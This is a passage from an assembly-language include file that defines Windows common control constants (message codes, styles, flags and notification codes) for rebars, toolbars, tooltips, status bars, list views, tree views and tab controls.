RB_SETBARINFO equ WM_USER+4
RB_GETBANDINFO equ WM_USER+5
RB_SETBANDINFO equ WM_USER+6
RB_SETPARENT equ WM_USER+7
RB_HITTEST equ WM_USER+8
RB_GETRECT equ WM_USER+9
RB_GETBANDCOUNT equ WM_USER+12
RB_GETROWCOUNT equ WM_USER+13
RB_GETROWHEIGHT equ WM_USER+14
RB_IDTOINDEX equ WM_USER+16
RB_GETTOOLTIPS equ WM_USER+17
RB_SETTOOLTIPS equ WM_USER+18
RB_SETBKCOLOR equ WM_USER+19
RB_GETBKCOLOR equ WM_USER+20
RB_SETTEXTCOLOR equ WM_USER+21
RB_GETTEXTCOLOR equ WM_USER+22
RB_SIZETORECT equ WM_USER+23
RB_SETCOLORSCHEME equ CCM_SETCOLORSCHEME
RB_GETCOLORSCHEME equ CCM_GETCOLORSCHEME
RB_BEGINDRAG equ WM_USER+24
RB_ENDDRAG equ WM_USER+25
RB_DRAGMOVE equ WM_USER+26
RB_GETBARHEIGHT equ WM_USER+27
RB_MINIMIZEBAND equ WM_USER+30
RB_MAXIMIZEBAND equ WM_USER+31
RB_GETDROPTARGET equ CCM_GETDROPTARGET
RB_GETBANDBORDERS equ WM_USER+34
RB_SHOWBAND equ WM_USER+35
RB_SETPALETTE equ WM_USER+37
RB_GETPALETTE equ WM_USER+38
RB_MOVEBAND equ WM_USER+39
RB_SETUNICODEFORMAT equ CCM_SETUNICODEFORMAT
RB_GETUNICODEFORMAT equ CCM_GETUNICODEFORMAT
RBN_HEIGHTCHANGE equ RBN_FIRST-0
RBN_GETOBJECT equ RBN_FIRST-1
RBN_LAYOUTCHANGED equ RBN_FIRST-2
RBN_AUTOSIZE equ RBN_FIRST-3
RBN_BEGINDRAG equ RBN_FIRST-4
RBN_ENDDRAG equ RBN_FIRST-5
RBN_DELETINGBAND equ RBN_FIRST-6
RBN_DELETEDBAND equ RBN_FIRST-7
RBN_CHILDSIZE equ RBN_FIRST-8
RBNM_ID equ 00000001h
RBNM_STYLE equ 00000002h
RBNM_LPARAM equ 00000004h
RBHT_NOWHERE equ 0001h
RBHT_CAPTION equ 0002h
RBHT_CLIENT equ 0003h
RBHT_GRABBER equ 0004h
CLR_NONE equ 0FFFFFFFFh
CLR_DEFAULT equ 0FF000000h
ILC_MASK equ 0001h
ILC_COLOR equ 0000h
ILC_COLORDDB equ 00FEh
ILC_COLOR4 equ 0004h
ILC_COLOR8 equ 0008h
ILC_COLOR16 equ 0010h
ILC_COLOR24 equ 0018h
ILC_COLOR32 equ 0020h
ILC_PALETTE equ 0800h
ILD_NORMAL equ 0000h
ILD_TRANSPARENT equ 0001h
ILD_MASK equ 0010h
ILD_IMAGE equ 0020h
ILD_BLEND25 equ 0002h
ILD_BLEND50 equ 0004h
ILD_OVERLAYMASK equ 0F00h
ILD_SELECTED equ ILD_BLEND50
ILD_FOCUS equ ILD_BLEND25
ILD_BLEND equ ILD_BLEND50
CLR_HILIGHT equ CLR_DEFAULT
HDS_HORZ equ 00000000h
HDS_BUTTONS equ 00000002h
HDS_HIDDEN equ 00000008h
HDI_WIDTH equ 0001h
HDI_HEIGHT equ HDI_WIDTH
HDI_TEXT equ 0002h
HDI_FORMAT equ 0004h
HDI_LPARAM equ 0008h
HDI_BITMAP equ 0010h
HDF_LEFT equ 0
HDF_RIGHT equ 1
HDF_CENTER equ 2
HDF_JUSTIFYMASK equ 0003h
HDF_RTLREADING equ 4
HDF_OWNERDRAW equ 8000h
HDF_STRING equ 4000h
HDF_BITMAP equ 2000h
HDM_GETITEMCOUNT equ HDM_FIRST+0
HDM_INSERTITEM equ HDM_FIRST+1
HDM_INSERTITEMW equ HDM_FIRST+10
HDM_DELETEITEM equ HDM_FIRST+2
HDM_GETITEM equ HDM_FIRST+3
HDM_GETITEMW equ HDM_FIRST+11
HDM_SETITEM equ HDM_FIRST+4
HDM_SETITEMW equ HDM_FIRST+12
HDM_LAYOUT equ HDM_FIRST+5
HHT_NOWHERE equ 0001h
HHT_ONHEADER equ 0002h
HHT_ONDIVIDER equ 0004h
HHT_ONDIVOPEN equ 0008h
HHT_ABOVE equ 0100h
HHT_BELOW equ 0200h
HHT_TORIGHT equ 0400h
HHT_TOLEFT equ 0800h
HDM_HITTEST equ HDM_FIRST+6
HDN_ITEMCHANGING equ HDN_FIRST-0
HDN_ITEMCHANGINGW equ HDN_FIRST-20
HDN_ITEMCHANGED equ HDN_FIRST-1
HDN_ITEMCHANGEDW equ HDN_FIRST-21
HDN_ITEMCLICK equ HDN_FIRST-2
HDN_ITEMCLICKW equ HDN_FIRST-22
HDN_ITEMDBLCLICK equ HDN_FIRST-3
HDN_ITEMDBLCLICKW equ HDN_FIRST-23
HDN_DIVIDERDBLCLICK equ HDN_FIRST-5
HDN_DIVIDERDBLCLICKW equ HDN_FIRST-25
HDN_BEGINTRACK equ HDN_FIRST-6
HDN_BEGINTRACKW equ HDN_FIRST-26
HDN_ENDTRACK equ HDN_FIRST-7
HDN_ENDTRACKW equ HDN_FIRST-27
HDN_TRACK equ HDN_FIRST-8
HDN_TRACKW equ HDN_FIRST-28
CMB_MASKED equ 02h
TBSTATE_CHECKED equ 01h
TBSTATE_PRESSED equ 02h
TBSTATE_ENABLED equ 04h
TBSTATE_HIDDEN equ 08h
TBSTATE_INDETERMINATE equ 10h
TBSTATE_WRAP equ 20h
TBSTYLE_BUTTON equ 00h
TBSTYLE_SEP equ 01h
TBSTYLE_CHECK equ 02h
TBSTYLE_GROUP equ 04h
TBSTYLE_CHECKGROUP equ TBSTYLE_GROUP|TBSTYLE_CHECK
TBSTYLE_TOOLTIPS equ 0100h
TBSTYLE_WRAPABLE equ 0200h
TBSTYLE_ALTDRAG equ 0400h
TBSTYLE_FLAT equ 0800h
TBSTYLE_LIST equ 1000h
TBSTYLE_CUSTOMERASE equ 2000h
TBSTYLE_REGISTERDROP equ 4000h
TBSTYLE_TRANSPARENT equ 8000h
TB_ENABLEBUTTON equ WM_USER+1
TB_CHECKBUTTON equ WM_USER+2
TB_PRESSBUTTON equ WM_USER+3
TB_HIDEBUTTON equ WM_USER+4
TB_INDETERMINATE equ WM_USER+5
TB_ISBUTTONENABLED equ WM_USER+9
TB_ISBUTTONCHECKED equ WM_USER+10
TB_ISBUTTONPRESSED equ WM_USER+11
TB_ISBUTTONHIDDEN equ WM_USER+12
TB_ISBUTTONINDETERMINATE equ WM_USER+13
TB_SETSTATE equ WM_USER+17
TB_GETSTATE equ WM_USER+18
TB_ADDBITMAP equ WM_USER+19
TB_SETSTYLE equ WM_USER+56
TB_GETSTYLE equ WM_USER+57
HINST_COMMCTRL equ -1
IDB_STD_SMALL_COLOR equ 0
IDB_STD_LARGE_COLOR equ 1
IDB_VIEW_SMALL_COLOR equ 4
IDB_VIEW_LARGE_COLOR equ 5
STD_CUT equ 0
STD_COPY equ 1
STD_PASTE equ 2
STD_UNDO equ 3
STD_REDOW equ 4
STD_DELETE equ 5
STD_FILENEW equ 6
STD_FILEOPEN equ 7
STD_FILESAVE equ 8
STD_PRINTPRE equ 9
STD_PROPERTIES equ 10
STD_HELP equ 11
STD_FIND equ 12
STD_REPLACE equ 13
STD_PRINT equ 14
VIEW_LARGEICONS equ 0
VIEW_SMALLICONS equ 1
VIEW_LIST equ 2
VIEW_DETAILS equ 3
VIEW_SORTNAME equ 4
VIEW_SORTSIZE equ 5
VIEW_SORTDATE equ 6
VIEW_SORTTYPE equ 7
VIEW_PARENTFOLDER equ 8
VIEW_NETCONNECT equ 9
VIEW_NETDISCONNECT equ 10
VIEW_NEWFOLDER equ 11
TB_ADDBUTTONS equ WM_USER+20
TB_INSERTBUTTON equ WM_USER+21
TB_DELETEBUTTON equ WM_USER+22
TB_GETBUTTON equ WM_USER+23
TB_BUTTONCOUNT equ WM_USER+24
TB_COMMANDTOINDEX equ WM_USER+25
TB_SAVERESTORE equ WM_USER+26
TB_SAVERESTOREW equ WM_USER+76
TB_CUSTOMIZE equ WM_USER+27
TB_ADDSTRING equ WM_USER+28
TB_ADDSTRINGW equ WM_USER+77
TB_GETITEMRECT equ WM_USER+29
TB_BUTTONSTRUCTSIZE equ WM_USER+30
TB_SETBUTTONSIZE equ WM_USER+31
TB_SETBITMAPSIZE equ WM_USER+32
TB_AUTOSIZE equ WM_USER+33
TB_GETTOOLTIPS equ WM_USER+35
TB_SETTOOLTIPS equ WM_USER+36
TB_SETPARENT equ WM_USER+37
TB_SETROWS equ WM_USER+39
TB_GETROWS equ WM_USER+40
TB_SETCMDID equ WM_USER+42
TB_CHANGEBITMAP equ WM_USER+43
TB_GETBITMAP equ WM_USER+44
TB_GETBUTTONTEXT equ WM_USER+45
TB_GETBUTTONTEXTW equ WM_USER+75
TB_REPLACEBITMAP equ WM_USER+46
TBBF_LARGE equ 0001h
TB_GETBITMAPFLAGS equ WM_USER+41
TBN_GETBUTTONINFO equ TBN_FIRST-0
TBN_GETBUTTONINFOW equ TBN_FIRST-20
TBN_BEGINDRAG equ TBN_FIRST-1
TBN_ENDDRAG equ TBN_FIRST-2
TBN_BEGINADJUST equ TBN_FIRST-3
TBN_ENDADJUST equ TBN_FIRST-4
TBN_RESET equ TBN_FIRST-5
TBN_QUERYINSERT equ TBN_FIRST-6
TBN_QUERYDELETE equ TBN_FIRST-7
TBN_TOOLBARCHANGE equ TBN_FIRST-8
TBN_CUSTHELP equ TBN_FIRST-9
TTS_ALWAYSTIP equ 01h
TTS_NOPREFIX equ 02h
TTF_IDISHWND equ 01h
TTF_CENTERTIP equ 02h
TTF_RTLREADING equ 04h
TTF_SUBCLASS equ 10h
TTDT_AUTOMATIC equ 0
TTDT_RESHOW equ 1
TTDT_AUTOPOP equ 2
TTDT_INITIAL equ 3
TTM_ACTIVATE equ WM_USER+1
TTM_SETDELAYTIME equ WM_USER+3
TTM_ADDTOOL equ WM_USER+4
TTM_ADDTOOLW equ WM_USER+50
TTM_DELTOOL equ WM_USER+5
TTM_DELTOOLW equ WM_USER+51
TTM_NEWTOOLRECT equ WM_USER+6
TTM_NEWTOOLRECTW equ WM_USER+52
TTM_RELAYEVENT equ WM_USER+7
TTM_GETTOOLINFO equ WM_USER+8
TTM_GETTOOLINFOW equ WM_USER+53
TTM_SETTOOLINFO equ WM_USER+9
TTM_SETTOOLINFOW equ WM_USER+54
TTM_HITTEST equ WM_USER+10
TTM_HITTESTW equ WM_USER+55
TTM_GETTEXT equ WM_USER+11
TTM_GETTEXTW equ WM_USER+56
TTM_UPDATETIPTEXT equ WM_USER+12
TTM_UPDATETIPTEXTW equ WM_USER+57
TTM_GETTOOLCOUNT equ WM_USER+13
TTM_ENUMTOOLS equ WM_USER+14
TTM_ENUMTOOLSW equ WM_USER+58
TTM_GETCURRENTTOOL equ WM_USER+15
TTM_GETCURRENTTOOLW equ WM_USER+59
TTM_WINDOWFROMPOINT equ WM_USER+16
TTN_NEEDTEXT equ TTN_FIRST-0
TTN_NEEDTEXTW equ TTN_FIRST-10
TTN_SHOW equ TTN_FIRST-1
TTN_POP equ TTN_FIRST-2
SBARS_SIZEGRIP equ 0100h
SB_SETTEXT equ WM_USER+1
SB_SETTEXTW equ WM_USER+11
SB_GETTEXT equ WM_USER+2
SB_GETTEXTW equ WM_USER+13
SB_GETTEXTLENGTH equ WM_USER+3
SB_GETTEXTLENGTHW equ WM_USER+12
SB_SETPARTS equ WM_USER+4
SB_GETPARTS equ WM_USER+6
SB_GETBORDERS equ WM_USER+7
SB_SETMINHEIGHT equ WM_USER+8
SB_SIMPLE equ WM_USER+9
SB_GETRECT equ WM_USER+10
SBT_OWNERDRAW equ 1000h
SBT_NOBORDERS equ 0100h
SBT_POPOUT equ 0200h
SBT_RTLREADING equ 0400h
MINSYSCOMMAND equ SC_SIZE
TBS_AUTOTICKS equ 0001h
TBS_VERT equ 0002h
TBS_HORZ equ 0000h
TBS_TOP equ 0004h
TBS_BOTTOM equ 0000h
TBS_LEFT equ 0004h
TBS_RIGHT equ 0000h
TBS_BOTH equ 0008h
TBS_NOTICKS equ 0010h
TBS_ENABLESELRANGE equ 0020h
TBS_FIXEDLENGTH equ 0040h
TBS_NOTHUMB equ 0080h
TBM_GETPOS equ WM_USER
TBM_GETRANGEMIN equ WM_USER+1
TBM_GETRANGEMAX equ WM_USER+2
TBM_GETTIC equ WM_USER+3
TBM_SETTIC equ WM_USER+4
TBM_SETPOS equ WM_USER+5
TBM_SETRANGE equ WM_USER+6
TBM_SETRANGEMIN equ WM_USER+7
TBM_SETRANGEMAX equ WM_USER+8
TBM_CLEARTICS equ WM_USER+9
TBM_SETSEL equ WM_USER+10
TBM_SETSELSTART equ WM_USER+11
TBM_SETSELEND equ WM_USER+12
TBM_GETPTICS equ WM_USER+14
TBM_GETTICPOS equ WM_USER+15
TBM_GETNUMTICS equ WM_USER+16
TBM_GETSELSTART equ WM_USER+17
TBM_GETSELEND equ WM_USER+18
TBM_CLEARSEL equ WM_USER+19
TBM_SETTICFREQ equ WM_USER+20
TBM_SETPAGESIZE equ WM_USER+21
TBM_GETPAGESIZE equ WM_USER+22
TBM_SETLINESIZE equ WM_USER+23
TBM_GETLINESIZE equ WM_USER+24
TBM_GETTHUMBRECT equ WM_USER+25
TBM_GETCHANNELRECT equ WM_USER+26
TBM_SETTHUMBLENGTH equ WM_USER+27
TBM_GETTHUMBLENGTH equ WM_USER+28
TB_LINEUP equ 0
TB_LINEDOWN equ 1
TB_PAGEUP equ 2
TB_PAGEDOWN equ 3
TB_THUMBPOSITION equ 4
TB_THUMBTRACK equ 5
TB_TOP equ 6
TB_BOTTOM equ 7
TB_ENDTRACK equ 8
DL_BEGINDRAG equ WM_USER+133
DL_DRAGGING equ WM_USER+134
DL_DROPPED equ WM_USER+135
DL_CANCELDRAG equ WM_USER+136
DL_CURSORSET equ 0
DL_STOPCURSOR equ 1
DL_COPYCURSOR equ 2
DL_MOVECURSOR equ 3
UD_MAXVAL equ 7FFFh
UD_MINVAL equ -UD_MAXVAL
UDS_WRAP equ 0001h
UDS_SETBUDDYINT equ 0002h
UDS_ALIGNRIGHT equ 0004h
UDS_ALIGNLEFT equ 0008h
UDS_AUTOBUDDY equ 0010h
UDS_ARROWKEYS equ 0020h
UDS_HORZ equ 0040h
UDS_NOTHOUSANDS equ 0080h
UDM_SETRANGE equ WM_USER+101
UDM_GETRANGE equ WM_USER+102
UDM_SETPOS equ WM_USER+103
UDM_GETPOS equ WM_USER+104
UDM_SETBUDDY equ WM_USER+105
UDM_GETBUDDY equ WM_USER+106
UDM_SETACCEL equ WM_USER+107
UDM_GETACCEL equ WM_USER+108
UDM_SETBASE equ WM_USER+109
UDM_GETBASE equ WM_USER+110
UDN_DELTAPOS equ UDN_FIRST-1
PBM_SETRANGE equ WM_USER+1
PBM_SETPOS equ WM_USER+2
PBM_DELTAPOS equ WM_USER+3
PBM_SETSTEP equ WM_USER+4
PBM_STEPIT equ WM_USER+5
HOTKEYF_SHIFT equ 01h
HOTKEYF_CONTROL equ 02h
HOTKEYF_ALT equ 04h
HOTKEYF_EXT equ 08h
HKCOMB_NONE equ 0001h
HKCOMB_S equ 0002h
HKCOMB_C equ 0004h
HKCOMB_A equ 0008h
HKCOMB_SC equ 0010h
HKCOMB_SA equ 0020h
HKCOMB_CA equ 0040h
HKCOMB_SCA equ 0080h
HKM_SETHOTKEY equ WM_USER+1
HKM_GETHOTKEY equ WM_USER+2
HKM_SETRULES equ WM_USER+3
LVS_ICON equ 0000h
LVS_REPORT equ 0001h
LVS_SMALLICON equ 0002h
LVS_LIST equ 0003h
LVS_TYPEMASK equ 0003h
LVS_SINGLESEL equ 0004h
LVS_SHOWSELALWAYS equ 0008h
LVS_SORTASCENDING equ 0010h
LVS_SORTDESCENDING equ 0020h
LVS_SHAREIMAGELISTS equ 0040h
LVS_NOLABELWRAP equ 0080h
LVS_AUTOARRANGE equ 0100h
LVS_EDITLABELS equ 0200h
LVS_NOSCROLL equ 2000h
LVS_TYPESTYLEMASK equ 0fc00h
LVS_ALIGNTOP equ 0000h
LVS_ALIGNLEFT equ 0800h
LVS_ALIGNMASK equ 0c00h
LVS_OWNERDRAWFIXED equ 0400h
LVS_NOCOLUMNHEADER equ 4000h
LVS_NOSORTHEADER equ 8000h
LVM_GETBKCOLOR equ LVM_FIRST+0
LVM_SETBKCOLOR equ LVM_FIRST+1
LVM_GETIMAGELIST equ LVM_FIRST+2
LVSIL_NORMAL equ 0
LVSIL_SMALL equ 1
LVSIL_STATE equ 2
LVM_SETIMAGELIST equ LVM_FIRST+3
LVM_GETITEMCOUNT equ LVM_FIRST+4
LVIF_TEXT equ 0001h
LVIF_IMAGE equ 0002h
LVIF_PARAM equ 0004h
LVIF_STATE equ 0008h
LVIS_FOCUSED equ 0001h
LVIS_SELECTED equ 0002h
LVIS_CUT equ 0004h
LVIS_DROPHILITED equ 0008h
LVIS_OVERLAYMASK equ 0F00h
LVIS_STATEIMAGEMASK equ 0F000h
LPSTR_TEXTCALLBACKW equ -1
LPSTR_TEXTCALLBACK equ -1
I_IMAGECALLBACK equ -1
LVM_GETITEM equ LVM_FIRST+5
LVM_GETITEMW equ LVM_FIRST+75
LVM_SETITEM equ LVM_FIRST+6
LVM_SETITEMW equ LVM_FIRST+76
LVM_INSERTITEM equ LVM_FIRST+7
LVM_INSERTITEMW equ LVM_FIRST+77
LVM_DELETEITEM equ LVM_FIRST+8
LVM_DELETEALLITEMS equ LVM_FIRST+9
LVM_GETCALLBACKMASK equ LVM_FIRST+10
LVM_SETCALLBACKMASK equ LVM_FIRST+11
LVNI_ALL equ 0000h
LVNI_FOCUSED equ 0001h
LVNI_SELECTED equ 0002h
LVNI_CUT equ 0004h
LVNI_DROPHILITED equ 0008h
LVNI_ABOVE equ 0100h
LVNI_BELOW equ 0200h
LVNI_TOLEFT equ 0400h
LVNI_TORIGHT equ 0800h
LVM_GETNEXTITEM equ LVM_FIRST+12
LVFI_PARAM equ 0001h
LVFI_STRING equ 0002h
LVFI_PARTIAL equ 0008h
LVFI_WRAP equ 0020h
LVFI_NEARESTXY equ 0040h
LVM_FINDITEM equ LVM_FIRST+13
LVM_FINDITEMW equ LVM_FIRST+83
LVIR_BOUNDS equ 0
LVIR_ICON equ 1
LVIR_LABEL equ 2
LVIR_SELECTBOUNDS equ 3
LVM_GETITEMRECT equ LVM_FIRST+14
LVM_SETITEMPOSITION equ LVM_FIRST+15
LVM_GETITEMPOSITION equ LVM_FIRST+16
LVM_GETSTRINGWIDTH equ LVM_FIRST+17
LVM_GETSTRINGWIDTHW equ LVM_FIRST+87
LVHT_NOWHERE equ 0001h
LVHT_ONITEMICON equ 0002h
LVHT_ONITEMLABEL equ 0004h
LVHT_ONITEMSTATEICON equ 0008h
LVHT_ONITEM equ LVHT_ONITEMICON|LVHT_ONITEMLABEL|LVHT_ONITEMSTATEICON
LVHT_ABOVE equ 0008h
LVHT_BELOW equ 0010h
LVHT_TORIGHT equ 0020h
LVHT_TOLEFT equ 0040h
LVM_HITTEST equ LVM_FIRST+18
LVM_ENSUREVISIBLE equ LVM_FIRST+19
LVM_SCROLL equ LVM_FIRST+20
LVM_REDRAWITEMS equ LVM_FIRST+21
LVA_DEFAULT equ 0000h
LVA_ALIGNLEFT equ 0001h
LVA_ALIGNTOP equ 0002h
LVA_SNAPTOGRID equ 0005h
LVM_ARRANGE equ LVM_FIRST+22
LVM_EDITLABEL equ LVM_FIRST+23
LVM_EDITLABELW equ LVM_FIRST+118
LVM_GETEDITCONTROL equ LVM_FIRST+24
LVCF_FMT equ 0001h
LVCF_WIDTH equ 0002h
LVCF_TEXT equ 0004h
LVCF_SUBITEM equ 0008h
LVCFMT_LEFT equ 0000h
LVCFMT_RIGHT equ 0001h
LVCFMT_CENTER equ 0002h
LVCFMT_JUSTIFYMASK equ 0003h
LVM_GETCOLUMN equ LVM_FIRST+25
LVM_GETCOLUMNW equ LVM_FIRST+95
LVM_SETCOLUMN equ LVM_FIRST+26
LVM_SETCOLUMNW equ LVM_FIRST+96
LVM_INSERTCOLUMN equ LVM_FIRST+27
LVM_INSERTCOLUMNW equ LVM_FIRST+97
LVM_DELETECOLUMN equ LVM_FIRST+28
LVM_GETCOLUMNWIDTH equ LVM_FIRST+29
LVSCW_AUTOSIZE equ -1
LVSCW_AUTOSIZE_USEHEADER equ -2
LVM_SETCOLUMNWIDTH equ LVM_FIRST+30
LVM_CREATEDRAGIMAGE equ LVM_FIRST+33
LVM_GETVIEWRECT equ LVM_FIRST+34
LVM_GETTEXTCOLOR equ LVM_FIRST+35
LVM_SETTEXTCOLOR equ LVM_FIRST+36
LVM_GETTEXTBKCOLOR equ LVM_FIRST+37
LVM_SETTEXTBKCOLOR equ LVM_FIRST+38
LVM_GETTOPINDEX equ LVM_FIRST+39
LVM_GETCOUNTPERPAGE equ LVM_FIRST+40
LVM_GETORIGIN equ LVM_FIRST+41
LVM_UPDATE equ LVM_FIRST+42
LVM_SETITEMSTATE equ LVM_FIRST+43
LVM_GETITEMSTATE equ LVM_FIRST+44
LVM_GETITEMTEXT equ LVM_FIRST+45
LVM_GETITEMTEXTW equ LVM_FIRST+115
LVM_SETITEMTEXT equ LVM_FIRST+46
LVM_SETITEMTEXTW equ LVM_FIRST+116
LVM_SETITEMCOUNT equ LVM_FIRST+47
LVM_SORTITEMS equ LVM_FIRST+48
LVM_SETITEMPOSITION32 equ LVM_FIRST+49
LVM_GETSELECTEDCOUNT equ LVM_FIRST+50
LVM_GETITEMSPACING equ LVM_FIRST+51
LVM_GETISEARCHSTRING equ LVM_FIRST+52
LVM_GETISEARCHSTRINGW equ LVM_FIRST+117
LVN_ITEMCHANGING equ LVN_FIRST-0
LVN_ITEMCHANGED equ LVN_FIRST-1
LVN_INSERTITEM equ LVN_FIRST-2
LVN_DELETEITEM equ LVN_FIRST-3
LVN_DELETEALLITEMS equ LVN_FIRST-4
LVN_BEGINLABELEDIT equ LVN_FIRST-5
LVN_BEGINLABELEDITW equ LVN_FIRST-75
LVN_ENDLABELEDIT equ LVN_FIRST-6
LVN_ENDLABELEDITW equ LVN_FIRST-76
LVN_COLUMNCLICK equ LVN_FIRST-8
LVN_BEGINDRAG equ LVN_FIRST-9
LVN_BEGINRDRAG equ LVN_FIRST-11
LVN_GETDISPINFO equ LVN_FIRST-50
LVN_GETDISPINFOW equ LVN_FIRST-77
LVN_SETDISPINFO equ LVN_FIRST-51
LVN_SETDISPINFOW equ LVN_FIRST-78
LVIF_DI_SETITEM equ 1000h
LVN_KEYDOWN equ LVN_FIRST-55
TVS_HASBUTTONS equ 0001h
TVS_HASLINES equ 0002h
TVS_LINESATROOT equ 0004h
TVS_EDITLABELS equ 0008h
TVS_DISABLEDRAGDROP equ 0010h
TVS_SHOWSELALWAYS equ 0020h
TVIF_TEXT equ 0001h
TVIF_IMAGE equ 0002h
TVIF_PARAM equ 0004h
TVIF_STATE equ 0008h
TVIF_HANDLE equ 0010h
TVIF_SELECTEDIMAGE equ 0020h
TVIF_CHILDREN equ 0040h
TVIS_FOCUSED equ 0001h
TVIS_SELECTED equ 0002h
TVIS_CUT equ 0004h
TVIS_DROPHILITED equ 0008h
TVIS_BOLD equ 0010h
TVIS_EXPANDED equ 0020h
TVIS_EXPANDEDONCE equ 0040h
TVIS_OVERLAYMASK equ 0F00h
TVIS_STATEIMAGEMASK equ 0F000h
TVIS_USERMASK equ 0F000h
I_CHILDRENCALLBACK equ -1
TVI_ROOT equ 0FFFF0000h
TVI_FIRST equ 0FFFF0001h
TVI_LAST equ 0FFFF0002h
TVI_SORT equ 0FFFF0003h
TVM_INSERTITEM equ TV_FIRST+0
TVM_INSERTITEMW equ TV_FIRST+50
TVM_DELETEITEM equ TV_FIRST+1
TVM_EXPAND equ TV_FIRST+2
TVE_COLLAPSE equ 0001h
TVE_EXPAND equ 0002h
TVE_TOGGLE equ 0003h
TVE_COLLAPSERESET equ 8000h
TVM_GETITEMRECT equ TV_FIRST+4
TVM_GETCOUNT equ TV_FIRST+5
TVM_GETINDENT equ TV_FIRST+6
TVM_SETINDENT equ TV_FIRST+7
TVM_GETIMAGELIST equ TV_FIRST+8
TVSIL_NORMAL equ 0
TVSIL_STATE equ 2
TVM_SETIMAGELIST equ TV_FIRST+9
TVM_GETNEXTITEM equ TV_FIRST+10
TVGN_ROOT equ 0000h
TVGN_NEXT equ 0001h
TVGN_PREVIOUS equ 0002h
TVGN_PARENT equ 0003h
TVGN_CHILD equ 0004h
TVGN_FIRSTVISIBLE equ 0005h
TVGN_NEXTVISIBLE equ 0006h
TVGN_PREVIOUSVISIBLE equ 0007h
TVGN_DROPHILITE equ 0008h
TVGN_CARET equ 0009h
TVM_SELECTITEM equ TV_FIRST+11
TVM_GETITEM equ TV_FIRST+12
TVM_GETITEMW equ TV_FIRST+62
TVM_SETITEM equ TV_FIRST+13
TVM_SETITEMW equ TV_FIRST+63
TVM_EDITLABEL equ TV_FIRST+14
TVM_EDITLABELW equ TV_FIRST+65
TVM_GETEDITCONTROL equ TV_FIRST+15
TVM_GETVISIBLECOUNT equ TV_FIRST+16
TVM_HITTEST equ TV_FIRST+17
TVHT_NOWHERE equ 0001h
TVHT_ONITEMICON equ 0002h
TVHT_ONITEMLABEL equ 0004h
TVHT_ONITEMSTATEICON equ 0040h
TVHT_ONITEM equ TVHT_ONITEMICON|TVHT_ONITEMLABEL|TVHT_ONITEMSTATEICON
TVHT_ONITEMINDENT equ 0008h
TVHT_ONITEMBUTTON equ 0010h
TVHT_ONITEMRIGHT equ 0020h
TVHT_ABOVE equ 0100h
TVHT_BELOW equ 0200h
TVHT_TORIGHT equ 0400h
TVHT_TOLEFT equ 0800h
TVM_CREATEDRAGIMAGE equ TV_FIRST+18
TVM_SORTCHILDREN equ TV_FIRST+19
TVM_ENSUREVISIBLE equ TV_FIRST+20
TVM_SORTCHILDRENCB equ TV_FIRST+21
TVM_ENDEDITLABELNOW equ TV_FIRST+22
TVM_GETISEARCHSTRING equ TV_FIRST+23
TVM_GETISEARCHSTRINGW equ TV_FIRST+64
TVN_SELCHANGINGA equ TVN_FIRST-1
TVN_SELCHANGINGW equ TVN_FIRST-50
TVN_SELCHANGEDA equ TVN_FIRST-2
TVN_SELCHANGEDW equ TVN_FIRST-51
TVC_UNKNOWN equ 0000h
TVC_BYMOUSE equ 0001h
TVC_BYKEYBOARD equ 0002h
TVN_GETDISPINFOA equ TVN_FIRST-3
TVN_GETDISPINFOW equ TVN_FIRST-52
TVN_SETDISPINFOA equ TVN_FIRST-4
TVN_SETDISPINFOW equ TVN_FIRST-53
TVIF_DI_SETITEM equ 1000h
TVN_ITEMEXPANDING equ TVN_FIRST-5
TVN_ITEMEXPANDINGW equ TVN_FIRST-54
TVN_ITEMEXPANDED equ TVN_FIRST-6
TVN_ITEMEXPANDEDW equ TVN_FIRST-55
TVN_BEGINDRAG equ TVN_FIRST-7
TVN_BEGINDRAGW equ TVN_FIRST-56
TVN_BEGINRDRAG equ TVN_FIRST-8
TVN_BEGINRDRAGW equ TVN_FIRST-57
TVN_DELETEITEM equ TVN_FIRST-9
TVN_DELETEITEMW equ TVN_FIRST-58
TVN_BEGINLABELEDIT equ TVN_FIRST-10
TVN_BEGINLABELEDITW equ TVN_FIRST-59
TVN_ENDLABELEDIT equ TVN_FIRST-11
TVN_ENDLABELEDITW equ TVN_FIRST-60
TVN_KEYDOWN equ TVN_FIRST-12
TCS_FORCEICONLEFT equ 0010h
TCS_FORCELABELLEFT equ 0020h
TCS_TABS equ 0000h
TCS_BUTTONS equ 0100h
TCS_SINGLELINE equ 0000h
TCS_MULTILINE equ 0200h
TCS_RIGHTJUSTIFY equ 0000h
TCS_FIXEDWIDTH equ 0400h
TCS_RAGGEDRIGHT equ 0800h
TCS_FOCUSONBUTTONDOWN equ 1000h
TCS_OWNERDRAWFIXED equ 2000h
TCS_TOOLTIPS equ 4000h
TCS_FOCUSNEVER equ 8000h
TCM_FIRST equ 1300h
TCM_GETIMAGELIST equ TCM_FIRST+2
TCM_SETIMAGELIST equ TCM_FIRST+3
TCM_GETITEMCOUNT equ TCM_FIRST+4
TCIF_TEXT equ 0001h
TCIF_IMAGE equ 0002h
TCIF_RTLREADING equ 0004h
TCIF_PARAM equ 0008h
TCM_GETITEM equ TCM_FIRST+5
TCM_SETITEM equ TCM_FIRST+6
TCM_SETITEMW equ TCM_FIRST+61
TCM_INSERTITEM equ TCM_FIRST+7
TCM_INSERTITEMW equ TCM_FIRST+62
TCM_DELETEITEM equ TCM_FIRST+8
TCM_DELETEALLITEMS equ TCM_FIRST+9
TCM_GETITEMRECT equ TCM_FIRST+10
TCM_GETCURSEL equ TCM_FIRST+11
TCM_SETCURSEL equ TCM_FIRST+12
TCHT_NOWHERE equ 0001h
TCHT_ONITEMICON equ 0002h
TCHT_ONITEMLABEL equ 0004h
TCHT_ONITEM equ TCHT_ONITEMICON|TCHT_ONITEMLABEL
TCM_HITTEST equ TCM_FIRST+13
TCM_SETITEMEXTRA equ TCM_FIRST+14
TCM_ADJUSTRECT equ TCM_FIRST+40
TCM_SETITEMSIZE equ TCM_FIRST+41
TCM_REMOVEIMAGE equ TCM_FIRST+42
TCM_SETPADDING equ TCM_FIRST+43
TCM_GETROWCOUNT equ TCM_FIRST+44
TCM_GETTOOLTIPS equ TCM_FIRST+45
TCM_SETTOOLTIPS equ TCM_FIRST+46
TCM_GETCURFOCUS equ TCM_FIRST+47
TCM_SETCURFOCUS equ TCM_FIRST+48
TCN_KEYDOWN equ TCN_FIRST-0
TCN_SELCHANGE equ TCN_FIRST-1
TCN_SELCHANGING equ TCN_FIRST-2
ACS_CENTER equ 0001h
ACS_TRANSPARENT equ 0002h
ACS_AUTOPLAY equ 0004h
ACM_OPEN equ WM_USER+100
ACM_OPENW equ WM_USER+103
